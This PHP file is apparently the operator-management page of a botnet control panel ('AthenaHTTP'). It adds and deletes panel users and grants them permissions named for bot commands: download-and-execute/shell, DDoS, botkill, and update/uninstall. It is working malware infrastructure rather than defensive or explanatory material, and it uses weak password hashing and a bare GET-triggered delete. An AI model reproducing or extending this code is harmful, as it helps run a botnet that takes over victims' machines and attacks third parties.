<?php

	if(!defined('AthenaHTTP')) header('Location: ..');
	
	$STATUS_MESSAGE = '';
	$STATUS_NOTE = false;
	
	if($_GET['d'])
	{
		$result = mysql_query('DELETE FROM users WHERE id = \'' . mysql_real_escape_string($_GET['d']) . '\';');
		
		if($result)
			$STATUS_MESSAGE = 'User deleted.';
		else
			$STATUS_MESSAGE = 'Failed to delete user.';
		
		$STATUS_NOTE = true;
	}
	
	if($_POST['user_username'] && $_POST['user_password'] && $_POST['user_admin'])
	{
		$hashedpass = hash('sha512', trim($_POST['user_password']) . '|' . trim($_POST['user_password']));
		$privs = $_POST['user_privs'];
		
		$PRIV1 = '0';
		$PRIV2 = '0';
		$PRIV3 = '0';
		$PRIV4 = '0';
		
		if(count($privs) != 0)	
		{
			foreach($privs as $part)
			{
				switch($part)
				{
					case 'priv1':
						$PRIV1 = '1';
						break;
						
					case 'priv2':
						$PRIV2 = '1';
						break;
						
					case 'priv3':
						$PRIV3 = '1';
						break;
						
					case 'priv4':
						$PRIV4 = '1';
						break;
				}
			}
		}

		$result = mysql_query('INSERT INTO users SET ' . 
							  'username=\'' . mysql_real_escape_string(trim($_POST['user_username'])) . '\', ' . 
							  'password=\'' . $hashedpass . '\', ' . 
							  'lastip=\'N/A\', ' .
							  'admin=\'' . ($_POST['user_admin'] == 'yes' ? '1' : '0') . '\', ' . 
							  'priv1=\'' . $PRIV1 . '\', ' . 
							  'priv2=\'' . $PRIV2 . '\', ' . 
							  'priv3=\'' . $PRIV3 . '\', ' . 
							  'priv4=\'' . $PRIV4 . '\';');
		
		if($result)
			$STATUS_MESSAGE = 'User added.';
		else
			$STATUS_MESSAGE = 'Failed to add user.';
		
		$STATUS_NOTE = true;
	}
	
	$result = mysql_query('SELECT * FROM users WHERE 1;');
	
	while($row = mysql_fetch_array($result))
	{
		$privs = '';
	
		if($row['priv1'] || $row['admin']) $privs .= 'Download & Execute/Shell, ';
		if($row['priv2'] || $row['admin']) $privs .= 'DDoS/View/SmartView, ';
		if($row['priv3'] || $row['admin']) $privs .= 'Botkill, ';
		if($row['priv4'] || $row['admin']) $privs .= 'Update/Uninstall, ';
		
		$privs = substr($privs, 0, -2);
	
		$PAGE_INCLUDE_USERLIST .= '					<tr>' . "\n";
		$PAGE_INCLUDE_USERLIST .= '						<td>' . htmlentities($row['id']) . '</td>' . "\n";
		$PAGE_INCLUDE_USERLIST .= '						<td>' . htmlentities($row['username']) . '</td>' . "\n";
		$PAGE_INCLUDE_USERLIST .= '						<td>' . htmlentities($row['lastip']) . '</td>' . "\n";
		
		if(htmlentities($row['lastseen']) != 0)
		{
			$PAGE_INCLUDE_USERLIST .= '						<td>' . ($TIME - htmlentities($row['lastseen'])) . ' Seconds ago</td>' . "\n";
		}
		else
		{
			$PAGE_INCLUDE_USERLIST .= '						<td>Never Seen</td>' . "\n";
		}
		
		$PAGE_INCLUDE_USERLIST .= '						<td>' . $privs . '</td>' . "\n";
		$PAGE_INCLUDE_USERLIST .= '						<td>' . ($row['admin'] == '1' ? 'Yes' : 'No') . '</td>' . "\n";
		
		if($row['id'] != $USERINFO['id'])		
			$PAGE_INCLUDE_USERLIST .= '						<td><input onClick="navigateTo(\'./index.php?p=userlist&d=' . htmlentities($row['id']) . '\');" type="button" class="paginate" value="Delete" /></td>' . "\n";
		else
			$PAGE_INCLUDE_USERLIST .= '						<td></td>' . "\n";
			
		$PAGE_INCLUDE_USERLIST .= '					</tr>' . "\n";
	}
?>